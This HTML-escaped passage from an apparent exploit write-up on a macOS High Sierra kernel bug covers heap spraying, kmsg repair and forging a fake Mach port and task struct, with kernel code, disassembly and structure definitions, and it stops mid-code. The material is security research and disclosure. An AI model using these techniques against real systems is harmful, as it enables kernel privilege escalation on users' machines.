    &lt;span class=&quot;n&quot;&gt;ipc_importance_elem_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elem&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_importance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IIE_NULL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ipc_importance_elem_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unlink_elem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;unlink_elem&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IIE_TYPE_INHERIT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IIE_TYPE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_importance_elem_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_importance_inherit_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iii_to_task&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
            &lt;span class=&quot;n&quot;&gt;elem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;queue_remove&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unlink_elem&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iie_kmsgs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_kmsg_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ikm_inheritance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_importance&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IIE_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;To fully understand what happens to our corrupted fields, we need to look at two macros: &lt;code class=&quot;highlighter-rouge&quot;&gt;IIE_TYPE&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;queue_remove&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot; readability=&quot;6&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define IIE_TYPE(e) ((e)-&amp;gt;iie_bits &amp;amp; IIE_TYPE_MASK)
&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot; readability=&quot;9.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;14&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define queue_remove(head, elt, type, field)            \
MACRO_BEGIN                                             \
    queue_entry_t __next, __prev;                       \
                                                        \
    __next = (elt)-&amp;gt;field.next;                         \
    __prev = (elt)-&amp;gt;field.prev;                         \
                                                        \
    if ((head) == __next)                               \
        (head)-&amp;gt;prev = __prev;                          \
    else                                                \
        ((type)(void *)__next)-&amp;gt;field.prev = __prev;    \
                                                        \
    if ((head) == __prev)                               \
        (head)-&amp;gt;next = __next;                          \
    else                                                \
        ((type)(void *)__prev)-&amp;gt;field.next = __next;    \
                                                        \
    (elt)-&amp;gt;field.next = NULL;                           \
    (elt)-&amp;gt;field.prev = NULL;                           \
MACRO_END
&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;So &lt;code class=&quot;highlighter-rouge&quot;&gt;ipc_importance_kmsg_unlink&lt;/code&gt; will ultimately dereference all of &lt;code class=&quot;highlighter-rouge&quot;&gt;ikm_importance&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;ikm_inheritance.prev&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;ikm_inheritance.next&lt;/code&gt;, which we corrupt. Due to the conversion between &lt;code class=&quot;highlighter-rouge&quot;&gt;cursorLoc&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;screenCursorFixed&lt;/code&gt;/&lt;code class=&quot;highlighter-rouge&quot;&gt;desktopCursorFixed&lt;/code&gt;, there is no way the values we write can be valid pointers again. So we have no choice but to somehow repair what we’re breaking with reading before we can receive the kmsg, and the only tool we’ve got at our disposal to pull this off is &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt;. In order to determine what is and isn’t possible, we first have to finalise our plan for how exactly we shape the heap.&lt;/p&gt;
&lt;p&gt;In my implementation, I’m first spraying &lt;code class=&quot;highlighter-rouge&quot;&gt;OSString&lt;/code&gt;s of size &lt;code class=&quot;highlighter-rouge&quot;&gt;0x3000&lt;/code&gt;. After offsetting &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt; and detecting where it lands, I punch a hole of size &lt;code class=&quot;highlighter-rouge&quot;&gt;0x30000&lt;/code&gt; (i.e. just deallocate 16 strings) for the kmsg, but before doing so I create at lower addresses 16 other holes of size &lt;code class=&quot;highlighter-rouge&quot;&gt;0x2d000&lt;/code&gt; (i.e. 15 strings). That way, new allocations of &lt;code class=&quot;highlighter-rouge&quot;&gt;0x2d000&lt;/code&gt; bytes or less will first fill up those holes before interfering with our plans, and any allocations bigger than &lt;code class=&quot;highlighter-rouge&quot;&gt;0x30000&lt;/code&gt; bytes are too big for our kmsg hole and will leave us alone anyway.&lt;br/&gt;Now, what does a kmsg size of &lt;code class=&quot;highlighter-rouge&quot;&gt;0x30000&lt;/code&gt; bytes imply? Currently on High Sierra, the sizes of &lt;code class=&quot;highlighter-rouge&quot;&gt;struct ipc_kmsg&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;mach_msg_base_t&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;mach_msg_max_trailer_t&lt;/code&gt; are &lt;code class=&quot;highlighter-rouge&quot;&gt;0x58&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;0x24&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;0x44&lt;/code&gt; bytes respectively, and we’ve already seen that the kernel reserves 16 bytes for every 12 bytes of message body size. That means the body part of our kmsg will have to be &lt;code class=&quot;highlighter-rouge&quot;&gt;0x30000 - 0x58 - 0x24 - 0x44 = 0x2ff40&lt;/code&gt; bytes, so the mach message we send will need a &lt;code class=&quot;highlighter-rouge&quot;&gt;0x2ff40 / 16 * 12 = 0x23f70&lt;/code&gt; bytes body. Since we don’t send any descriptors, that will actually lead to &lt;code class=&quot;highlighter-rouge&quot;&gt;0x2ff40 - 0x23f70 = 0xbfd0&lt;/code&gt; bytes after the kmsg header being completely unused. That’s good, because that lets us do whatever we want with &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt; around the kmsg header without the chance of corrupting anything after it. And due to our hole-punching, there will still be a string buffer of &lt;code class=&quot;highlighter-rouge&quot;&gt;0x3000&lt;/code&gt; bytes right before it - not quite enough to buffer the full &lt;code class=&quot;highlighter-rouge&quot;&gt;0x5ae8&lt;/code&gt; bytes of &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt;, but still a lot.&lt;/p&gt;
&lt;p&gt;So what can we &lt;em&gt;actually&lt;/em&gt; do with &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt; in terms of repairs now? The easiest thing would be if we could just use &lt;code class=&quot;highlighter-rouge&quot;&gt;evg-&amp;gt;eventFlags&lt;/code&gt; to write zeroes. For that, we have to consider both initialisation and kernel usage of the values around &lt;code class=&quot;highlighter-rouge&quot;&gt;eventFlags&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://siguza.github.io/IOHIDeous/assets/img/4-evg.svg&quot;&gt;&lt;img src=&quot;https://siguza.github.io/IOHIDeous/assets/img/4-evg.svg&quot; alt=&quot;evg initialisation&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;That looks rather bad. The fact that values so shortly before and after &lt;code class=&quot;highlighter-rouge&quot;&gt;eventFlags&lt;/code&gt; are initialised to non-zero or unknown values means that when we write &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; four times, at least one of those will be overwritten again. The next best approach (to me anyway) would seem to try and use &lt;code class=&quot;highlighter-rouge&quot;&gt;cursorSema&lt;/code&gt; initialisation to zero out things - since it’s at the very beginning of &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt; there will be no writes before it, so we could just continuously shift &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt; further down in memory until we’re after the kmsg header. However if &lt;code class=&quot;highlighter-rouge&quot;&gt;cursorSema&lt;/code&gt; is zero, the kernel may change it to a non-zero value at any given time. If that happens right before we move &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt; again, we leave a non-zero value and haven’t repaired anything. There are some more fields in &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt; that are initialised to zero, most notably in &lt;code class=&quot;highlighter-rouge&quot;&gt;evg-&amp;gt;lleq&lt;/code&gt;, an array of &lt;code class=&quot;highlighter-rouge&quot;&gt;NXEQElement&lt;/code&gt;s. As far as I can tell, no code in &lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDFamily&lt;/code&gt; accesses that memory at all beyond initialisation, and it doesn’t seem to be exported to anywhere in kernelland either. That puts kernel writes out of the way and just leaves initialisation:&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://siguza.github.io/IOHIDeous/assets/img/5-lleq.svg&quot;&gt;&lt;img src=&quot;https://siguza.github.io/IOHIDeous/assets/img/5-lleq.svg&quot; alt=&quot;lleq initialisation&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Since we have an array of those, we can nicely use &lt;code class=&quot;highlighter-rouge&quot;&gt;lleq[1]&lt;/code&gt; to zero things out while the last 64 bytes of &lt;code class=&quot;highlighter-rouge&quot;&gt;lleq[0]&lt;/code&gt; will give us enough space to leave the rest of the header intact:&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://siguza.github.io/IOHIDeous/assets/img/6-zero.svg&quot;&gt;&lt;img src=&quot;https://siguza.github.io/IOHIDeous/assets/img/6-zero.svg&quot; alt=&quot;lleq zeroing&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;(As is visible, it gives us &lt;em&gt;only just&lt;/em&gt; enough space, down to the bit! As if we’re blessed with luck or something. :D)&lt;br/&gt;Using the &lt;code class=&quot;highlighter-rouge&quot;&gt;sema&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;event.type&lt;/code&gt; fields to zero out, we need to perform three operations in total - two to undo the earlier corruption, and one more because the &lt;code class=&quot;highlighter-rouge&quot;&gt;next&lt;/code&gt; field writes non-zero values again right before the memory we zero out, which is the lower half of &lt;code class=&quot;highlighter-rouge&quot;&gt;ikm_importance&lt;/code&gt;. Ultimately we will write a non-zero value to &lt;code class=&quot;highlighter-rouge&quot;&gt;ikm_qos_override&lt;/code&gt;, but that has no bad consequence. Note we &lt;em&gt;could&lt;/em&gt; also have used the last element of &lt;code class=&quot;highlighter-rouge&quot;&gt;lleq&lt;/code&gt; instead, which gets its &lt;code class=&quot;highlighter-rouge&quot;&gt;next&lt;/code&gt; field set to zero, but then we would’ve again had to make sure that we have &lt;code class=&quot;highlighter-rouge&quot;&gt;0x6000&lt;/code&gt; bytes of mapped memory instead of just &lt;code class=&quot;highlighter-rouge&quot;&gt;0x3000&lt;/code&gt;, and… meh.&lt;/p&gt;
&lt;p&gt;Anyway we can repair the kmsg now, and with that there’s nothing standing between us and our fake mach port anymore! Well, except the actual fake port and its kobject, that is. Getting a usable definition of &lt;code class=&quot;highlighter-rouge&quot;&gt;struct ipc_port&lt;/code&gt; to userland is a bit tedious and requires digging through a dozen headers, but here’s the result (to be fair, I had done most of the work for Phœnix/PhœnixNonce already and merely had to update it - also, &lt;code class=&quot;highlighter-rouge&quot;&gt;kptr_t&lt;/code&gt; is just typedef’ed to &lt;code class=&quot;highlighter-rouge&quot;&gt;uint64_t&lt;/code&gt;):&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot; readability=&quot;7.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_bits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_references&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;kptr_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_lock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// spinlock
&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;waitq_interlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;waitq_set_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;waitq_prepost_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;kptr_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;kptr_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;waitq_queue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;waitq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;kptr_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;messages&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;natural_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;seqno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;natural_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;receiver_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;uint16_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msgcount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;uint16_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;qlimit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;kptr_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;klist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_messages&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;kptr_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_receiver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;kptr_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_kobject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;kptr_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_nsrequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;kptr_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_pdrequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;kptr_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;kptr_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_premsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;ip_context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;natural_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;natural_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_mscount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;natural_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_srights&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;natural_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_sorights&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kport_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;With &lt;code class=&quot;highlighter-rouge&quot;&gt;struct task&lt;/code&gt; I was much lazier, only defining what’s really necessary (with the exception of &lt;code class=&quot;highlighter-rouge&quot;&gt;ip_lock&lt;/code&gt;, which isn’t actually needed):&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot; readability=&quot;7&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;9&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;kptr_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_lock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// mutex
&lt;/span&gt;    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ref_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OFF_TASK_BSD_INFO&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kptr_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)];&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;kptr_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bsd_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ktask_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;OFF_TASK_BSD_INFO&lt;/code&gt; is the offset of the &lt;code class=&quot;highlighter-rouge&quot;&gt;bsd_info&lt;/code&gt; field in the kernel’s task struct, which can be grabbed from the disassembly of &lt;code class=&quot;highlighter-rouge&quot;&gt;get_bsdtask_info&lt;/code&gt; (here &lt;code class=&quot;highlighter-rouge&quot;&gt;0x390&lt;/code&gt;):&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;8&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;11&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;;-- _get_bsdtask_info:
0xffffff80002bccd0      55             push rbp
0xffffff80002bccd1      4889e5         mov rbp, rsp
0xffffff80002bccd4      488b87900300.  mov rax, qword [rdi + 0x390]
0xffffff80002bccdb      5d             pop rbp
0xffffff80002bccdc      c3             ret
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Now after moving &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt; for the last time, we can zero out the second and third page of our shared memory (I’m avoiding the first page just in case the kernel writes anything there), and initialise the two structures like this (where &lt;code class=&quot;highlighter-rouge&quot;&gt;shmem_addr&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;shmem_kern&lt;/code&gt; and the userland and kernel addresses of the shared memory, respectively):&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot; readability=&quot;7.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;n&quot;&gt;kport_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kport&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kport_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shmem_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;pagesize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
